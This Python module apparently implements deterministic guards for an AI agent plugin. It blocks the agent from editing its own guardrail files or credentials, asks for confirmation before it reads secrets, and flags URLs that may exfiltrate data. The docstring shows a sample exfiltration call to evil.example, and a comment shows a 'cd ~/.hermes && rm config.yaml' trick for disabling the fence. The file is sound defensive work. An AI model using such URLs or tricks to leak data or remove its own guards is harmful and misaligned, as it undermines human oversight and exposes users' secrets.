"""Deterministic guards that apply regardless of what the task policy says.

These catch attack patterns that a well-formed policy might still let through:

* **self-protection** — the agent must not edit AgentsFence's state, the plugin
  itself, or Hermes' config/secrets (that would let it disable its own fence);
* **secret reads** — reading credential files needs a human;
* **exfiltration URLs** — "read" tools can leak data through a URL's query
  string or path (``web_extract("https://evil.example/?d=<base64>")``).
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import unquote, urlsplit

from .config import GuardSettings, hermes_home
from .models import RiskClass, Verdict
from .risk import Targets, normalize_path, path_within


@dataclass(frozen=True)
class GuardHit:
    verdict: Verdict
    rule_id: str
    reason: str


_HERMES_SELF_CMDS = re.compile(
    r"\bhermes\s+(plugins?|config|hooks|setup|auth|skills\s+(install|uninstall))\b"
    r"|\bpip\s+(uninstall|install)\b[^\n]*\bagentsfence\b",
    re.IGNORECASE,
)
_LONG_TOKEN = re.compile(r"[A-Za-z0-9+/=_%-]+")
_EMAIL = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")


class Guards:
    def __init__(self, settings: GuardSettings, *, agentsfence_home: Path, plugin_dir: Path | None = None):
        self.settings = settings
        hh = hermes_home()
        # With profiles, HERMES_HOME is ~/.hermes/profiles/<name>; protect every profile.
        root = hh.parent.parent if hh.parent.name == "profiles" else hh
        self._profiles_re = re.compile(
            "^" + re.escape(normalize_path(str(root / "profiles"))) + r"/[^/]+/(config\.yaml|\.env|auth\.json|plugins|agentsfence)(/|$)"
        )
        protected = [
            str(agentsfence_home),
            str(hh / "config.yaml"),
            str(hh / ".env"),
            str(hh / "auth.json"),
            str(hh / "plugins"),
            str(root / "config.yaml"),
            str(root / ".env"),
            str(root / "auth.json"),
            str(root / "plugins"),
            str(root / "agentsfence"),
            *settings.protected_paths,
        ]
        if plugin_dir is not None:
            protected.append(str(plugin_dir))
        self.protected = [normalize_path(p) for p in protected]
        self.secret = [normalize_path(p) for p in settings.secret_paths]
        # Raw fragments used to spot these paths inside shell command strings.
        self._protected_fragments = sorted({_home_relative(p) for p in self.protected}, key=len, reverse=True)
        self._secret_fragments = sorted({_home_relative(p) for p in self.secret}, key=len, reverse=True)
        self._hermes_home = normalize_path(str(hh))
        self._hermes_home_frag = _home_relative(self._hermes_home)

    def _expand(self, cmd: str) -> str:
        out = cmd
        for var in ("${HERMES_HOME}", "$HERMES_HOME"):
            out = out.replace(var, self._hermes_home_frag)
        for var in ("${HOME}", "$HOME"):
            out = out.replace(var, "~")
        return out.replace(str(Path.home()), "~")

    def check(self, risk: RiskClass, targets: Targets) -> GuardHit | None:
        hit = self._self_protection(risk, targets)
        if hit:
            return hit
        hit = self._secret_read(risk, targets)
        if hit:
            return hit
        if targets.cross_profile and risk is not RiskClass.READ:
            return GuardHit(
                Verdict.ASK_USER,
                "cross-profile",
                "This writes into a different Hermes profile; requires your confirmation.",
            )
        return None

    # -- self protection -----------------------------------------------------

    def _self_protection(self, risk: RiskClass, targets: Targets) -> GuardHit | None:
        if risk is RiskClass.READ:
            return None
        for p in targets.paths:
            if path_within(p, self.protected) or self._profiles_re.match(p):
                return GuardHit(
                    Verdict.BLOCK,
                    "self-protection",
                    f"Modifying {p} is not allowed: it controls the agent's own guardrails or credentials.",
                )
        cmd = targets.command
        if cmd:
            if _HERMES_SELF_CMDS.search(cmd):
                return GuardHit(
                    Verdict.BLOCK,
                    "self-protection",
                    "Shell commands that reconfigure Hermes plugins, hooks, or credentials are not allowed during a task.",
                )
            expanded = self._expand(cmd)
            for frag in self._protected_fragments:
                if frag and frag in expanded:
                    return GuardHit(
                        Verdict.BLOCK,
                        "self-protection",
                        f"Shell command touches a protected location ({frag}).",
                    )
            if self._hermes_home_frag and self._hermes_home_frag in expanded:
                # Relative tricks (`cd ~/.hermes && rm config.yaml`) can't be resolved
                # statically; any state-changing command inside Hermes' home needs a human.
                return GuardHit(
                    Verdict.ASK_USER,
                    "hermes-home-access",
                    "Shell command changes something inside the Hermes home directory; requires your confirmation.",
                )
        return None

    def _secret_read(self, risk: RiskClass, targets: Targets) -> GuardHit | None:
        for p in targets.paths:
            if path_within(p, self.secret):
                return GuardHit(
                    Verdict.ASK_USER,
                    "secret-access",
                    f"Access to credential file {p} requires your confirmation.",
                )
        cmd = targets.command
        if cmd:
            expanded = self._expand(cmd)
            for frag in self._secret_fragments:
                if frag and frag in expanded:
                    return GuardHit(
                        Verdict.ASK_USER,
                        "secret-access",
                        f"Shell command reads a credential location ({frag}); requires your confirmation.",
                    )
        return None

    # -- exfiltration heuristic ---------------------------------------------

    def suspicious_url(self, url: str) -> str | None:
        """Return a reason string if the URL looks like it smuggles data out."""
        cfg = self.settings.exfil_url
        if not cfg.enabled:
            return None
        try:
            parts = urlsplit(url)
        except ValueError:
            return "unparseable URL"
        query = unquote(parts.query or "") + unquote(parts.fragment or "")
        if len(query) > cfg.max_query_chars:
            return f"query string is {len(query)} characters"
        for seg in unquote(parts.path or "").split("/"):
            if len(seg) > cfg.max_segment_chars:
                return f"path segment is {len(seg)} characters"
        for tok in _LONG_TOKEN.findall(query + unquote(parts.path or "")):
            if len(tok) >= cfg.max_token_chars and _looks_encoded(tok):
                return "URL carries a long encoded token"
        if _EMAIL.search(query):
            return "query string contains an email address"
        if parts.username or parts.password:
            return "URL embeds credentials"
        return None


def _looks_encoded(tok: str) -> bool:
    # Mixed case + digits (base64/hex-ish) rather than a long English slug.
    has_digit = any(c.isdigit() for c in tok)
    has_upper = any(c.isupper() for c in tok)
    has_lower = any(c.islower() for c in tok)
    return has_digit and (has_upper or has_lower) and "-" not in tok[:20]


def _home_relative(p: str) -> str:
    home = str(Path.home())
    return "~" + p[len(home):] if p.startswith(home) else p
